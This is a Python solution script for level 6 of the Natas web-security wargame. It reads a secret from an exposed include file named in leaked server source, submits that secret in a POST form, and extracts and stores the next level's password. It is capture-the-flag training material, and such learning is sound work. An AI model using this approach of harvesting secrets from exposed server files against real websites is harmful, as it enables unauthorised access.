"""
natas6: POST requests, server source leaks a secret
"""

import re
import requests
from typing import Optional

from natas_utils import *

LEVEL = 6

def solve(url: str, login: LevelLogin) -> Optional[str]:
    # main challenge page has a link to view source code at /index-source.html
    #
    # server will check a secret sent in a POST request against the server's secret,
    # and return the flag if the check succeeds
    #
    # source code leaks the include path for the secret, and that file is accessible!
    response = requests.get(url + "/includes/secret.inc", auth=login)

    match = re.search(r'secret = "([A-Z]+)"', response.text)
    secret = match.group(1)

    # submit the form
    response = requests.post(url, auth=login, data={"secret": secret, "submit": ""})

    # get the flag
    natas7_password = try_level_login(7, extract_candidate_passwords(response.text))

    return natas7_password

if __name__ == "__main__":
    url, login = load_level(LEVEL)
    natas7_password = solve(url, login)

    if natas7_password:
        print("natas7:", natas7_password)
        store_level_password(LEVEL + 1, natas7_password)
    else:
        exit("Failed to get password for the next level.")